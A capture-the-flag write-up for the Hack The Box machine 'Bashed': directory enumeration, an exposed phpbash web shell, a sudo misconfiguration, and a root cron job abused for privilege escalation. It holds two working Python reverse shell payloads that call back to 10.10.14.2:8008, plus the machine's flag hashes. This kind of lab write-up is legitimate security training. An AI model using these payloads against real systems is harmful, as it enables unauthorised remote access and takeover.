# CTF: Bashed (HTB)

## Metadata

- **Target IP:** 10.129.225.147
    
- **OS:** Linux
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-03
    
- **Tags:** #HTB #Linux #Webshell #Sudo #CronJob #Python #phpbash
    

---

## Reconnaissance

### Port Scanning

Initial scan confirmed an HTTP server running on port **80**.

### Directory Enumeration

Running **Gobuster** revealed several interesting directories, most notably `/dev/`.

Bash

```
gobuster dir -u http://$target -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

**Significant Findings:**

- `/dev/`: Contains development scripts.
    
- `/uploads/`: Potential directory for file uploads.
    
- `/php/`: Internal PHP scripts.
    

---

## Credential Cracking

_No traditional credential cracking (brute-forcing) was required for this machine, as initial access and lateral movement were achieved via misconfigured permissions._

---

## Foothold

### Web Exploitation

Navigating to `/dev/` revealed `phpbash.php`, a web-based semi-interactive shell. Using this, I gained initial execution as `www-data`.

**Initial Enumeration:**

Bash

```
www-data@bashed:/var/www/html/dev# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Upgrading to a Reverse Shell

To gain a more stable environment, I executed a Python3 reverse shell one-liner:

Bash

```
# On Kali
rlwrap nc -nvlp 8008

# In phpbash.php
export RHOST="10.10.14.2";export RPORT=8008;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

---

## Lateral Movement

### www-data $\rightarrow$ scriptmanager

Checking `sudo -l` showed that `www-data` could run any command as the user `scriptmanager` without a password.

Bash

```
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

I transitioned to a `scriptmanager` shell:

Bash

```
sudo -u scriptmanager python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### scriptmanager $\rightarrow$ root

While enumerating as `scriptmanager`, I found a `/scripts` directory at the root of the filesystem. This directory contained `test.py`, which was owned by `scriptmanager` but appeared to be interacting with a file (`test.txt`) owned by **root**.

Using **pspy64** to monitor processes, I identified a root-level cron job:

Plaintext

```
2026/02/03 13:52:01 CMD: UID=0  PID=1374 | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```

**Exploitation:**

Since the cron job executes _any_ `.py` file in the `/scripts` directory as root, I created a Python reverse shell named `rev.py` in that directory:

Python

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.2",8008));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

After the cron job cycled (every minute), I received a shell as root.

---

## Flags

- **User (arrexel):** `8120afa9b1823dd620e9277cb988718d`
    
- **Root (SYSTEM):** `89303ec3ee5f87707f1fe1d6137a014f`
